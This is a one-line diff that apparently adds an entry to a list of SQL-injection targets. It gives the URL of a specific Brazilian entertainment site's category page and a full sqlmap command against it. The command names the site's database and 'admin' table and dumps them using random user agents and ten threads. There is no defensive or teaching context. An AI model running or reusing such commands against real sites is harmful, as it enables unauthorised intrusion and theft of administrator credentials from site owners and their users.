@@ -1,0 +1,1 @@
+http://www.centraldoentretenimento.com.br/categorias.php?id_categoria=23 (GET)  # sqlmap.py -u http://www.centraldoentretenimento.com.br/categorias.php?id_categoria=23 -D site1376502848 --threads 10 -v3 --random-agent -T admin --dump
